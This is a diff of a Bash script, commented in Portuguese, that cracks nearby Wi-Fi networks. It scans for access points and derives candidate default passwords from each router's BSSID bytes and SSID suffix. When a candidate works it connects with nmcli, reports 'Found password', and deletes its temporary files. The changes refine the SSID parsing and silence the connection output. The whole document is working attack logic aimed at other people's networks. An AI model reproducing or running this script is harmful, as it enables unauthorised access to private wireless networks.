@@ -44,7 +44,7 @@ cat /tmp/temp.txt | sed 's/\\//' | sed 's/\\//' | sed 's/\\//' | sed 's/\\//' | 
 # Remove o temp.txt
 rm -rf /tmp/temp.txt
 # Separa o SSID em um arquivo
-cat /tmp/temp1.txt | cut -d ":" -f7 > /tmp/ssid.txt
+cat /tmp/temp1.txt | cut -d ":" -f7 | cut -d " " -f1 > /tmp/ssid.txt
 # Separa o BSSID em um arquivo
 cat /tmp/temp1.txt | cut -d ":" -f1,2,3,4,5,6 > /tmp/bssid.txt
 # Variavel QtdWifi recebe a quantidade de redes encontradas
@@ -97,15 +97,15 @@ cat /tmp/bssid_atk.txt | cut -d ":" -f2,3,4,5,6 > /tmp/bssid_atk1.txt && cat /tm
 # 1º byte em diante
 cat /tmp/bssid_atk.txt | cut -d ":" -f1,2,3,4,5,6 > /tmp/bssid_atk1.txt && cat /tmp/bssid_atk1.txt | sed 's/://' | sed 's/://' | sed 's/://' | sed 's/://' | sed 's/://' >> /tmp/password_atk.txt
 # Alterando o último byte (3º byte em diante)
-cat /tmp/ssid_atk.txt | cut -d "_" -f2 | rev | cut -c 1,2 | rev > /tmp/temp_newbyte.txt
+cat /tmp/ssid_atk.txt | sed 's/_ext//' | sed 's/_Ext//' | cut -d "_" -f2 | rev | cut -c 1,2 | rev > /tmp/temp_newbyte.txt
 cat /tmp/bssid_atk.txt | cut -d ":" -f3,4,5 > /tmp/bssid_atk1.txt && cat /tmp/bssid_atk1.txt | sed 's/://' | sed 's/://' | sed 's/://' > /tmp/temp_bssidclean.txt
 paste -d '' /tmp/temp_bssidclean.txt /tmp/temp_newbyte.txt >> /tmp/password_atk.txt
 # Alterando o último byte (2º byte em diante)
-cat /tmp/ssid_atk.txt | cut -d "_" -f2 | rev | cut -c 1,2 | rev > /tmp/temp_newbyte.txt
+cat /tmp/ssid_atk.txt | sed 's/_ext//' | sed 's/_Ext//' | cut -d "_" -f2 | rev | cut -c 1,2 | rev > /tmp/temp_newbyte.txt
 cat /tmp/bssid_atk.txt | cut -d ":" -f2,3,4,5 > /tmp/bssid_atk1.txt && cat /tmp/bssid_atk1.txt | sed 's/://' | sed 's/://' | sed 's/://' > /tmp/temp_bssidclean.txt
 paste -d '' /tmp/temp_bssidclean.txt /tmp/temp_newbyte.txt >> /tmp/password_atk.txt
 # Alterando o último byte (1º byte em diante)
-cat /tmp/ssid_atk.txt | cut -d "_" -f2 | rev | cut -c 1,2 | rev > /tmp/temp_newbyte.txt
+cat /tmp/ssid_atk.txt | sed 's/_ext//' | sed 's/_Ext//' | cut -d "_" -f2 | rev | cut -c 1,2 | rev > /tmp/temp_newbyte.txt
 cat /tmp/bssid_atk.txt | cut -d ":" -f1,2,3,4,5 > /tmp/bssid_atk1.txt && cat /tmp/bssid_atk1.txt | sed 's/://' |sed 's/://' | sed 's/://' | sed 's/://' > /tmp/temp_bssidclean.txt
 paste -d '' /tmp/temp_bssidclean.txt /tmp/temp_newbyte.txt >> /tmp/password_atk.txt
 
@@ -132,7 +132,7 @@ do
 		echo -e "${GREEN} [+] Found password: $pass ${END}"
 		echo " "
 		echo -e "${BLUE} [*] Connecting...${END}"
-		sudo nmcli dev wifi connect $SSID password $pass
+		sudo nmcli dev wifi connect $SSID password $pass >/dev/null
 		echo " "
 		echo -e "${BLUE} [*] Removing temp files...${END}"
 		rm -rf /tmp/password* /tmp/ssid* /tmp/bssid* /tmp/temp*
